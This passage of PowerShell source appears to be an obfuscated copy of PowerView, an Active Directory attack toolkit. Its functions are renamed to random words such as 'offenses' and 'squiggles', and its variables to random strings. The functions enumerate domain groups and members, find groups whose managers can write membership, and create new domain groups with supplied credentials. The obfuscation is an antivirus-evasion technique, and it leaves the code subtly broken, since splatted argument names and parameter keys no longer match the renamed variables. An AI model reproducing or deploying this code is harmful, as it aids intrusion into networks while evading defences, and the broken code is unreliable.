                            if ($BKCcLbrvfbNIi9U) { $tHAcROQOWB9HdRG['Properties'] = $BKCcLbrvfbNIi9U }
                            $Group = ensnared @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $9pNjjurFRb9jpSJ = ''
                $9QyouHvxMZKCIKN = ''
                $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                    $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($isYmprKvwrxUsJW -match '^S-1-') {
                        $9pNjjurFRb9jpSJ += "(objectsid=$isYmprKvwrxUsJW)"
                    }
                    elseif ($isYmprKvwrxUsJW -match '^CN=') {
                        $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                            $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[offenses] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                            $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                            $Q9ivyRQLJwyAFrk = cackles @SearcherArguments
                            if (-not $Q9ivyRQLJwyAFrk) {
                                Write-Warning "[offenses] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                            }
                        }
                    }
                    elseif ($isYmprKvwrxUsJW -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $bgaRJRRuWyecMST = (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                    }
                    elseif ($isYmprKvwrxUsJW.Contains('\')) {
                        $Z9PeoZBl9Cf9jhl = $isYmprKvwrxUsJW.Replace('\28', '(').Replace('\29', ')') | intermediate -nnLLVWbvFttZtjp Canonical
                        if ($Z9PeoZBl9Cf9jhl) {
                            $CaOmjDkUFtCqvby = $Z9PeoZBl9Cf9jhl.SubString(0, $Z9PeoZBl9Cf9jhl.IndexOf('/'))
                            $T9tockrmJu9UTGT = $isYmprKvwrxUsJW.Split('\')[1]
                            $9pNjjurFRb9jpSJ += "(samAccountName=$T9tockrmJu9UTGT)"
                            $tHAcROQOWB9HdRG['Domain'] = $CaOmjDkUFtCqvby
                            Write-Verbose "[offenses] Extracted domain '$CaOmjDkUFtCqvby' from '$isYmprKvwrxUsJW'"
                            $Q9ivyRQLJwyAFrk = cackles @SearcherArguments
                        }
                    }
                    else {
                        $9pNjjurFRb9jpSJ += "(|(samAccountName=$isYmprKvwrxUsJW)(name=$isYmprKvwrxUsJW))"
                    }
                }

                if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                    $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
                }

                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[offenses] Searching for adminCount=1'
                    $9QyouHvxMZKCIKN += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $ZtvsAZTjQgy9mRG = $PSBoundParameters['GroupScope']
                    $9QyouHvxMZKCIKN = Switch ($ZtvsAZTjQgy9mRG) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[offenses] Searching for group scope '$ZtvsAZTjQgy9mRG'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $xrCAhVrHL9vPAfg = $PSBoundParameters['GroupProperty']
                    $9QyouHvxMZKCIKN = Switch ($xrCAhVrHL9vPAfg) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[offenses] Searching for group property '$xrCAhVrHL9vPAfg'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[offenses] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                    $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
                }

                $Q9ivyRQLJwyAFrk.filter = "(&(objectCategory=group)$9QyouHvxMZKCIKN)"
                Write-Verbose "[offenses] filter string: $($Q9ivyRQLJwyAFrk.filter)"

                if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $Q9ivyRQLJwyAFrk.FindOne() }
                else { $xSLNEIXByfNTAdG = $Q9ivyRQLJwyAFrk.FindAll() }
                $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {

                        $Group = $_
                    }
                    else {
                        $Group = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($xSLNEIXByfNTAdG) {
                    try { $xSLNEIXByfNTAdG.dispose() }
                    catch {
                        Write-Verbose "[offenses] Error disposing of the Results object"
                    }
                }
                $Q9ivyRQLJwyAFrk.dispose()
            }
        }
    }
}


function fetuses {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $JbtS9UlqTiGk9qR,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $LhnZsdcroBUqwrh,

        [ValidateNotNullOrEmpty()]
        [String]
        $bZXZZOdJRlyaKks,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    $DiFXM9AnKByvDqk = @{
        'Identity' = $JbtS9UlqTiGk9qR
    }
    if ($PSBoundParameters['Domain']) { $DiFXM9AnKByvDqk['Domain'] = $pkMxgDCVHqOym9m }
    if ($PSBoundParameters['Credential']) { $DiFXM9AnKByvDqk['Credential'] = $szvFVWkPJummdcf }
    $LpgwDvCRKxnE9zi = Gautama @ContextArguments

    if ($LpgwDvCRKxnE9zi) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($LpgwDvCRKxnE9zi.Context)


        $Group.SamAccountName = $LpgwDvCRKxnE9zi.Identity

        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $LpgwDvCRKxnE9zi.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $LhnZsdcroBUqwrh
        }
        else {
            $Group.DisplayName = $LpgwDvCRKxnE9zi.Identity
        }

        if ($PSBoundParameters['Description']) {
            $Group.Description = $bZXZZOdJRlyaKks
        }

        Write-Verbose "[fetuses] Attempting to create group '$JbtS9UlqTiGk9qR'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[fetuses] Group '$JbtS9UlqTiGk9qR' successfully created"
            $Group
        }
        catch {
            Write-Warning "[fetuses] Error creating group '$JbtS9UlqTiGk9qR' : $_"
        }
    }
}


function sideshows {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m
            $rT9EZJuWEfY9rVY = $pkMxgDCVHqOym9m
        }
        else {
            $rT9EZJuWEfY9rVY = $Env:USERDNSDOMAIN
        }


        offenses @SearcherArguments | ForEach-Object {
            $tHAcROQOWB9HdRG['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $tHAcROQOWB9HdRG['Identity'] = $_.managedBy
            $Null = $tHAcROQOWB9HdRG.Remove('LDAPFilter')



            $xpeXJvFn9HgXVah = ensnared @SearcherArguments

            $lWnJ99ExQWrIcTO = New-Object PSObject
            $lWnJ99ExQWrIcTO | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $lWnJ99ExQWrIcTO | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $lWnJ99ExQWrIcTO | Add-Member Noteproperty 'ManagerName' $xpeXJvFn9HgXVah.samaccountname
            $lWnJ99ExQWrIcTO | Add-Member Noteproperty 'ManagerDistinguishedName' $xpeXJvFn9HgXVah.distinguishedName


            if ($xpeXJvFn9HgXVah.samaccounttype -eq 0x10000000) {
                $lWnJ99ExQWrIcTO | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($xpeXJvFn9HgXVah.samaccounttype -eq 0x30000000) {
                $lWnJ99ExQWrIcTO | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $MSR9yzCM9HFBXpC = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $MSR9yzCM9HFBXpC['Server'] = $vzBgfX9wPWmbsYZ }
            if ($PSBoundParameters['SearchScope']) { $MSR9yzCM9HFBXpC['SearchScope'] = $HWlMnJozs9zEkRJ }
            if ($PSBoundParameters['ResultPageSize']) { $MSR9yzCM9HFBXpC['ResultPageSize'] = $hHyMPLAr9azKKcQ }
            if ($PSBoundParameters['ServerTimeLimit']) { $MSR9yzCM9HFBXpC['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
            if ($PSBoundParameters['Tombstone']) { $MSR9yzCM9HFBXpC['Tombstone'] = $gPSKVqwcbkEyaoZ }
            if ($PSBoundParameters['Credential']) { $MSR9yzCM9HFBXpC['Credential'] = $szvFVWkPJummdcf }













            $lWnJ99ExQWrIcTO | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $lWnJ99ExQWrIcTO.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $lWnJ99ExQWrIcTO
        }
    }
}


function squiggles {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $hFIwjkalJslEl9j,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $NB9nTPotpd9ulhq,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $tHAcROQOWB9HdRG['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }

        $kjrB9uCaUhqSpoz = @{}
        if ($PSBoundParameters['Domain']) { $kjrB9uCaUhqSpoz['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Server']) { $kjrB9uCaUhqSpoz['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['Credential']) { $kjrB9uCaUhqSpoz['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        $Q9ivyRQLJwyAFrk = cackles @SearcherArguments
        if ($Q9ivyRQLJwyAFrk) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $tHAcROQOWB9HdRG['Identity'] = $MhNmgElNMTxhWpJ
                $tHAcROQOWB9HdRG['Raw'] = $True
                $Group = offenses @SearcherArguments

                if (-not $Group) {
                    Write-Warning "[squiggles] Error searching for group with identity: $MhNmgElNMTxhWpJ"
                }
                else {
                    $fwVAwgZLsahyzgi = $Group.properties.item('samaccountname')[0]
                    $jmYATYVcDfHtwDw = $Group.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $TWdIqokkbXCg9Mt = $pkMxgDCVHqOym9m
                    }
                    else {

                        if ($jmYATYVcDfHtwDw) {
                            $TWdIqokkbXCg9Mt = $jmYATYVcDfHtwDw.SubString($jmYATYVcDfHtwDw.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[squiggles] Using LDAP matching rule to recurse on '$jmYATYVcDfHtwDw', only user accounts will be returned."
                    $Q9ivyRQLJwyAFrk.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$jmYATYVcDfHtwDw))"
                    $Q9ivyRQLJwyAFrk.PropertiesToLoad.AddRange(('distinguishedName'))
                    $sDYnzWrKftKJNli = $Q9ivyRQLJwyAFrk.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $tHAcROQOWB9HdRG.Remove('Raw')
            }
            else {
                $9pNjjurFRb9jpSJ = ''
                $9QyouHvxMZKCIKN = ''
                $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                    $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($isYmprKvwrxUsJW -match '^S-1-') {
                        $9pNjjurFRb9jpSJ += "(objectsid=$isYmprKvwrxUsJW)"
                    }
                    elseif ($isYmprKvwrxUsJW -match '^CN=') {
                        $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                            $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[squiggles] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                            $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                            $Q9ivyRQLJwyAFrk = cackles @SearcherArguments
                            if (-not $Q9ivyRQLJwyAFrk) {
                                Write-Warning "[squiggles] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                            }
                        }
                    }
                    elseif ($isYmprKvwrxUsJW -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $bgaRJRRuWyecMST = (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                    }
                    elseif ($isYmprKvwrxUsJW.Contains('\')) {
                        $Z9PeoZBl9Cf9jhl = $isYmprKvwrxUsJW.Replace('\28', '(').Replace('\29', ')') | intermediate -nnLLVWbvFttZtjp Canonical
                        if ($Z9PeoZBl9Cf9jhl) {
                            $CaOmjDkUFtCqvby = $Z9PeoZBl9Cf9jhl.SubString(0, $Z9PeoZBl9Cf9jhl.IndexOf('/'))
                            $T9tockrmJu9UTGT = $isYmprKvwrxUsJW.Split('\')[1]
                            $9pNjjurFRb9jpSJ += "(samAccountName=$T9tockrmJu9UTGT)"
                            $tHAcROQOWB9HdRG['Domain'] = $CaOmjDkUFtCqvby
                            Write-Verbose "[squiggles] Extracted domain '$CaOmjDkUFtCqvby' from '$isYmprKvwrxUsJW'"
                            $Q9ivyRQLJwyAFrk = cackles @SearcherArguments
                        }
                    }
                    else {
                        $9pNjjurFRb9jpSJ += "(samAccountName=$isYmprKvwrxUsJW)"
                    }
                }

                if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                    $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[squiggles] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                    $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
                }

                $Q9ivyRQLJwyAFrk.filter = "(&(objectCategory=group)$9QyouHvxMZKCIKN)"
                Write-Verbose "[squiggles] squiggles filter string: $($Q9ivyRQLJwyAFrk.filter)"
                try {
                    $tP9ZFuQ9oFJi9ZB = $Q9ivyRQLJwyAFrk.FindOne()
                }
                catch {
                    Write-Warning "[squiggles] Error searching for group with identity '$MhNmgElNMTxhWpJ': $_"
                    $sDYnzWrKftKJNli = @()
                }

                $fwVAwgZLsahyzgi = ''
                $jmYATYVcDfHtwDw = ''

                if ($tP9ZFuQ9oFJi9ZB) {
                    $sDYnzWrKftKJNli = $tP9ZFuQ9oFJi9ZB.properties.item('member')

                    if ($sDYnzWrKftKJNli.count -eq 0) {

                        $nYdnIJaRo9RFRMW = $False
                        $HbJBAZIjTszsRTt = 0
                        $Top = 0

                        while (-not $nYdnIJaRo9RFRMW) {
                            $Top = $HbJBAZIjTszsRTt + 1499
                            $WpZv9dATNO9lbAA="member;range=$HbJBAZIjTszsRTt-$Top"
                            $HbJBAZIjTszsRTt += 1500
                            $Null = $Q9ivyRQLJwyAFrk.PropertiesToLoad.Clear()
                            $Null = $Q9ivyRQLJwyAFrk.PropertiesToLoad.Add("$WpZv9dATNO9lbAA")
                            $Null = $Q9ivyRQLJwyAFrk.PropertiesToLoad.Add('samaccountname')
                            $Null = $Q9ivyRQLJwyAFrk.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $tP9ZFuQ9oFJi9ZB = $Q9ivyRQLJwyAFrk.FindOne()
                                $PEWHk9taXcfUnbd = $tP9ZFuQ9oFJi9ZB.Properties.PropertyNames -like "member;range=*"
                                $sDYnzWrKftKJNli += $tP9ZFuQ9oFJi9ZB.Properties.item($PEWHk9taXcfUnbd)
                                $fwVAwgZLsahyzgi = $tP9ZFuQ9oFJi9ZB.properties.item('samaccountname')[0]
                                $jmYATYVcDfHtwDw = $tP9ZFuQ9oFJi9ZB.properties.item('distinguishedname')[0]

                                if ($sDYnzWrKftKJNli.count -eq 0) {
                                    $nYdnIJaRo9RFRMW = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $nYdnIJaRo9RFRMW = $True
                            }
                        }
                    }
                    else {
                        $fwVAwgZLsahyzgi = $tP9ZFuQ9oFJi9ZB.properties.item('samaccountname')[0]
                        $jmYATYVcDfHtwDw = $tP9ZFuQ9oFJi9ZB.properties.item('distinguishedname')[0]
                        $sDYnzWrKftKJNli += $tP9ZFuQ9oFJi9ZB.Properties.item($PEWHk9taXcfUnbd)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $TWdIqokkbXCg9Mt = $pkMxgDCVHqOym9m
                    }
                    else {

                        if ($jmYATYVcDfHtwDw) {
                            $TWdIqokkbXCg9Mt = $jmYATYVcDfHtwDw.SubString($jmYATYVcDfHtwDw.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($9mLdlSJRwrOuSuV in $sDYnzWrKftKJNli) {
                if ($hFIwjkalJslEl9j -and $EKbpeO9PujYxSMp) {
                    $wDpWXLYTGZrAWN9 = $_.Properties
                }
                else {
                    $NVVHymkRBXaCUZf = $tHAcROQOWB9HdRG.Clone()
                    $NVVHymkRBXaCUZf['Identity'] = $9mLdlSJRwrOuSuV
                    $NVVHymkRBXaCUZf['Raw'] = $True
                    $NVVHymkRBXaCUZf['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = ensnared @ObjectSearcherArguments
                    $wDpWXLYTGZrAWN9 = $Object.Properties
                }

                if ($wDpWXLYTGZrAWN9) {
                    $pXtwzvZJmBafF9s = New-Object PSObject
                    $pXtwzvZJmBafF9s | Add-Member Noteproperty 'GroupDomain' $TWdIqokkbXCg9Mt
                    $pXtwzvZJmBafF9s | Add-Member Noteproperty 'GroupName' $fwVAwgZLsahyzgi
                    $pXtwzvZJmBafF9s | Add-Member Noteproperty 'GroupDistinguishedName' $jmYATYVcDfHtwDw

                    if ($wDpWXLYTGZrAWN9.objectsid) {
                        $QhiubkSzPR9qSpE = ((New-Object System.Security.Principal.SecurityIdentifier $wDpWXLYTGZrAWN9.objectsid[0], 0).Value)
                    }
                    else {
                        $QhiubkSzPR9qSpE = $Null
                    }

                    try {
                        $9cYaPmf9hSdLErK = $wDpWXLYTGZrAWN9.distinguishedname[0]
                        if ($9cYaPmf9hSdLErK -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $QhiubkSzPR9qSpE) {
                                    $QhiubkSzPR9qSpE = $wDpWXLYTGZrAWN9.cn[0]
                                }
                                $eNRa9kUTsdWb9Uc = intermediate -MhNmgElNMTxhWpJ $QhiubkSzPR9qSpE -nnLLVWbvFttZtjp 'DomainSimple' @ADNameArguments

                                if ($eNRa9kUTsdWb9Uc) {
                                    $CXxiKTNyvIENfyI = $eNRa9kUTsdWb9Uc.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[squiggles] Error converting $9cYaPmf9hSdLErK"
                                    $CXxiKTNyvIENfyI = $Null
                                }
                            }
                            catch {
                                Write-Warning "[squiggles] Error converting $9cYaPmf9hSdLErK"
                                $CXxiKTNyvIENfyI = $Null
                            }
                        }
                        else {

                            $CXxiKTNyvIENfyI = $9cYaPmf9hSdLErK.SubString($9cYaPmf9hSdLErK.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $9cYaPmf9hSdLErK = $Null
                        $CXxiKTNyvIENfyI = $Null
                    }

                    if ($wDpWXLYTGZrAWN9.samaccountname) {

                        $tzEgjS9u99dzkeq = $wDpWXLYTGZrAWN9.samaccountname[0]
                    }
                    else {

                        try {
                            $tzEgjS9u99dzkeq = congesting -ObjectSID $wDpWXLYTGZrAWN9.cn[0] @ADNameArguments
                        }
                        catch {

                            $tzEgjS9u99dzkeq = $wDpWXLYTGZrAWN9.cn[0]
                        }
                    }

                    if ($wDpWXLYTGZrAWN9.objectclass -match 'computer') {
                        $9SbzjWhGWQkrRGX = 'computer'
                    }
                    elseif ($wDpWXLYTGZrAWN9.objectclass -match 'group') {
                        $9SbzjWhGWQkrRGX = 'group'
                    }
                    elseif ($wDpWXLYTGZrAWN9.objectclass -match 'user') {
                        $9SbzjWhGWQkrRGX = 'user'
                    }
                    else {
                        $9SbzjWhGWQkrRGX = $Null
                    }
                    $pXtwzvZJmBafF9s | Add-Member Noteproperty 'MemberDomain' $CXxiKTNyvIENfyI
                    $pXtwzvZJmBafF9s | Add-Member Noteproperty 'MemberName' $tzEgjS9u99dzkeq
                    $pXtwzvZJmBafF9s | Add-Member Noteproperty 'MemberDistinguishedName' $9cYaPmf9hSdLErK
                    $pXtwzvZJmBafF9s | Add-Member Noteproperty 'MemberObjectClass' $9SbzjWhGWQkrRGX
                    $pXtwzvZJmBafF9s | Add-Member Noteproperty 'MemberSID' $QhiubkSzPR9qSpE
                    $pXtwzvZJmBafF9s.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $pXtwzvZJmBafF9s


                    if ($PSBoundParameters['Recurse'] -and $9cYaPmf9hSdLErK -and ($9SbzjWhGWQkrRGX -match 'group')) {
                        Write-Verbose "[squiggles] Manually recursing on group: $9cYaPmf9hSdLErK"
                        $tHAcROQOWB9HdRG['Identity'] = $9cYaPmf9hSdLErK
                        $Null = $tHAcROQOWB9HdRG.Remove('Properties')
                        squiggles @SearcherArguments
                    }
                }
            }
            $Q9ivyRQLJwyAFrk.dispose()
        }
    }
}


function idiomatic {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
